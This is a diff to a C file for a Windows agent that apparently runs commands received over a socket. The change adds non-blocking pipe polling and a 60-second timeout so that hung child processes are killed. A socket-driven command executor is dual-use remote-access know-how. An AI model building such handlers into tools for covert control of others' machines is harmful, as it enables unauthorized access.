@@ -11,6 +11,7 @@
 #include <string.h>
 
 #define EXEC_TIMEOUT_MS  60000  /* 60 second timeout */
+#define EXEC_POLL_MS       200  /* poll interval for pipe/process check */
 #define EXEC_BUF_SIZE    65536
 
 void handle_exec(SOCKET sock, const char *args)
@@ -94,7 +95,10 @@ void handle_exec(SOCKET sock, const char *args)
     }
     log_msg(LOG_EXEC, "CreateProcessA OK, PID=%lu", (unsigned long)pi.dwProcessId);
 
-    /* Read all output */
+    /* Read all output using non-blocking PeekNamedPipe + short waits.
+     * This prevents a hanging child process from blocking the entire
+     * agent's multiplex loop indefinitely. Each iteration blocks for
+     * at most EXEC_POLL_MS (200ms). */
     output = (char *)HeapAlloc(GetProcessHeap(), 0, output_cap);
     if (!output) {
         TerminateProcess(pi.hProcess, 1);
@@ -105,23 +109,69 @@ void handle_exec(SOCKET sock, const char *args)
         return;
     }
 
-    while (1) {
-        if (output_len + 4096 > output_cap) {
-            output_cap *= 2;
-            output = (char *)HeapReAlloc(GetProcessHeap(), 0,
-                                         output, output_cap);
-            if (!output) break;
+    {
+        DWORD start_tick = GetTickCount();
+        DWORD avail;
+        int timed_out = 0;
+
+        while (1) {
+            /* Check timeout */
+            if (GetTickCount() - start_tick >= (DWORD)EXEC_TIMEOUT_MS) {
+                log_msg(LOG_EXEC, "EXEC timeout (%ds), killing PID %lu",
+                        EXEC_TIMEOUT_MS / 1000,
+                        (unsigned long)pi.dwProcessId);
+                TerminateProcess(pi.hProcess, 1);
+                timed_out = 1;
+                break;
+            }
+
+            /* Check if data is available without blocking */
+            avail = 0;
+            if (PeekNamedPipe(hReadPipe, NULL, 0, NULL, &avail, NULL)
+                && avail > 0) {
+                /* Data available - ReadFile won't block */
+                if (output_len + 4096 > output_cap) {
+                    output_cap *= 2;
+                    output = (char *)HeapReAlloc(GetProcessHeap(), 0,
+                                                 output, output_cap);
+                    if (!output) break;
+                }
+
+                if (!ReadFile(hReadPipe, output + output_len, 4096,
+                              &bytes_read, NULL) || bytes_read == 0)
+                    break;
+
+                output_len += bytes_read;
+                continue;  /* Check for more data immediately */
+            }
+
+            /* No data available - check if process exited */
+            if (WaitForSingleObject(pi.hProcess, EXEC_POLL_MS)
+                == WAIT_OBJECT_0) {
+                /* Process exited - drain any remaining pipe data */
+                while (PeekNamedPipe(hReadPipe, NULL, 0, NULL, &avail, NULL)
+                       && avail > 0) {
+                    if (output_len + 4096 > output_cap) {
+                        output_cap *= 2;
+                        output = (char *)HeapReAlloc(GetProcessHeap(), 0,
+                                                     output, output_cap);
+                        if (!output) break;
+                    }
+                    if (!ReadFile(hReadPipe, output + output_len, 4096,
+                                  &bytes_read, NULL) || bytes_read == 0)
+                        break;
+                    output_len += bytes_read;
+                }
+                break;
+            }
+            /* Process still running, no data yet - loop back and re-check */
         }
 
-        if (!ReadFile(hReadPipe, output + output_len, 4096,
-                      &bytes_read, NULL) || bytes_read == 0)
-            break;
-
-        output_len += bytes_read;
+        if (timed_out) {
+            WaitForSingleObject(pi.hProcess, 2000);  /* Let it die */
+        }
     }
 
-    /* Wait for process to finish */
-    WaitForSingleObject(pi.hProcess, EXEC_TIMEOUT_MS);
     GetExitCodeProcess(pi.hProcess, &exit_code);
 
     log_msg(LOG_EXEC, "Process %lu exited, code=%lu, output=%lu bytes",
